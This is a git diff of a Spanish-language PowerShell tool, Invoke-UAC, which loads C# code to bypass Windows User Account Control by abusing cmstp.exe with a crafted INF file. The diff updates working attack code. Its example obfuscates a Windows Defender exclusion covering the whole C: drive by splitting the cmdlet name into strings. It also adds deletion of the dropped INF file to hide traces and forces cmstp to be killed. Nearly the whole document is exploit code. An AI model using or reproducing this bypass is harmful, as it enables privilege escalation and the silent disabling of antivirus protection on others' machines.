@@ -20,7 +20,7 @@ Este script usa codigo en C# para ser cargado en la memoria con Powershell usand
 .EXAMPLE
 
 Ejecutar Invoke-UAC abriendo powershell con un comando que añade una exclusion a Windows Defender.
-Invoke-UAC -Executable "powershell" -Command "Add-MpPreference -ExclusionPath C:\"
+Invoke-UAC -Executable "powershell" -Command ".("Add-MpP" + "reference") -ExclusionPath C:\"
 
 .EXAMPLE
 
@@ -34,7 +34,10 @@ Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x0
 
 
  param(
-     [Parameter()]
+     [Parameter(
+     Mandatory = $true
+     )]
+
      [string]$Executable,
  
      [Parameter()]
@@ -42,54 +45,9 @@ Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x0
 
  )
 
-    if (![System.IO.File]::Exists($Executable)) {
-        $Executable =  (Get-Command $Executable).Source
-         if (![System.IO.File]::Exists($Executable)) {
-                Write-Host "[!] Ejecutable no encontrado"
-                exit
-         }
-    }
-    
-    if ($Executable -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
-    {
-        if ($Command -ne "") {
-            $final = "powershell -c ""$Command"""
-        } else {
-            $final =  "$Executable $Command"
-        }
- 
-    } elseif  ($Executable -eq "C:\Windows\system32\cmd.exe") 
-    {
-        if ($Command -ne "") 
-        {
-            $final = "cmd /c ""$Command"""
-        } else {
-            $final =  "$Executable $Command"
-        }
-
-    } else 
-    {
-        
-        $final =  "$Executable $Command"
-    
-    }
-
-$sign = '$chicago$'
-$code = @"
-using System;
-using System.Threading;
-using System.Text;
-using System.IO;
-using System.Diagnostics;
-using System.ComponentModel;
-using System.Windows;
-using System.Runtime.InteropServices;
-
-public class CMSTPBypass
-{
- 
-     public static string InfData = @"[version]
-Signature=$sign
+$InfData = @'
+[version]
+Signature=$chicago$
 AdvancedINF=2.5
 
 [DefaultInstall]
@@ -104,14 +62,26 @@ taskkill /IM cmstp.exe /F
 49000,49001=AllUSer_LDIDSection, 7
 
 [AllUSer_LDIDSection]
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
 [Strings]
-ServiceName=""CorpVPN""
-ShortSvcName=""CorpVPN""
+ServiceName="CorpVPN"
+ShortSvcName="CorpVPN"
+'@
 
-";
-    
+$code = @"
+using System;
+using System.Threading;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Windows;
+using System.Runtime.InteropServices;
+
+public class CMSTPBypass
+{
+ 
     [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
     static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
 
@@ -121,10 +91,9 @@ ShortSvcName=""CorpVPN""
     [DllImport("user32.dll")]
     static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
 
-
     public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
-    public static string SetInfFile(string CommandToExecute)
+    public static string SetInfFile(string CommandToExecute,  string InfData)
     {
         StringBuilder OutputFile = new StringBuilder();
         OutputFile.Append("C:\\windows\\temp");
@@ -137,7 +106,7 @@ ShortSvcName=""CorpVPN""
         return OutputFile.ToString();
     }
 
-    public static bool Execute(string CommandToExecute)
+    public static bool Execute(string CommandToExecute, string InfData)
     {
 
         const int WM_SYSKEYDOWN = 0x0100;
@@ -145,17 +114,19 @@ ShortSvcName=""CorpVPN""
 
 
         StringBuilder InfFile = new StringBuilder();
-        InfFile.Append(SetInfFile(CommandToExecute));
+        InfFile.Append(SetInfFile(CommandToExecute, InfData));
 
         ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
         startInfo.Arguments = "/au " + InfFile.ToString();
         IntPtr dptr = Marshal.AllocHGlobal(1); 
         ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
 
-        Thread.Sleep(5000);
+        Thread.Sleep(3000);
         IntPtr WindowToFind = FindWindow(null, "CorpVPN"); // Window Titel
 
         PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);        
+        Thread.Sleep(5000);
+        File.Delete(InfFile.ToString());
         return true;
     }
 
@@ -163,15 +134,77 @@ ShortSvcName=""CorpVPN""
 }
 "@
 
+try 
+{
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $adm = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $user}       
+}
+catch 
+{
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $sid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
+    $adm = $currentUser.Groups | Where-Object { $_ -eq $sid }
+}
+
+if (!$adm) 
+{
+    Write-Host "El usuario actual no esta en el grupo de administradores"
+    return
+}
+
+try {
+    if (![System.IO.File]::Exists($Executable)) {
+        $Ex =  (Get-Command $Executable)
+        if (![System.IO.File]::Exists($Ex.Source)) {
+            $Executable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Executable)
+            f (![System.IO.File]::Exists($Executable)) {
+                Write-Host "[!] Ejecutable no encontrado"
+                exit
+            }
+        } else {
+            $Executable =  (Get-Command $Executable).Name
+        }
+    }
+}
+catch
+{
+    Write-Host "[!] Error en la ejecucion de Invoke-UAC, intente cerrar el proceso cmstp.exe"
+    exit
+}
+
+if ($Executable.Contains("powershell")) 
+{
+    if ($Command -ne "") {
+        $final = "powershell -c ""$Command"""
+    } else {
+        $final =  "$Executable $Command"
+    }
+ 
+} elseif ($Executable.Contains("cmd")) 
+{
+    if ($Command -ne "") 
+    {
+        $final = "cmd /c ""$Command"""
+    } else {
+        $final =  "$Executable $Command"
+    }
+
+} else 
+{
+        
+    $final =  "$Executable $Command"
+    
+}
+
 function Execute {
     try 
     {
-        $result = [CMSTPBypass]::Execute($final) 
+        $result = [CMSTPBypass]::Execute($final, $InfData) 
     } 
     catch 
     {
         Add-Type $code
-        $result = [CMSTPBypass]::Execute($final) 
+        $result = [CMSTPBypass]::Execute($final, $InfData) 
     }
 
     if ($result) {
@@ -186,12 +219,13 @@ $process =  ((Get-WmiObject -Class win32_process).name  | Select-String "cmstp" 
 if ($process -eq "cmstp") {
     try 
     {
-         Stop-Process -Name "cmstp"
+         Stop-Process -Name "cmstp" -Force
          Execute
     }
     catch 
     {
         Write-Host "[!] Error en la ejecucion de Invoke-UAC, intente cerrar el proceso cmstp.exe"
+        exit
     }
 } 
 else {
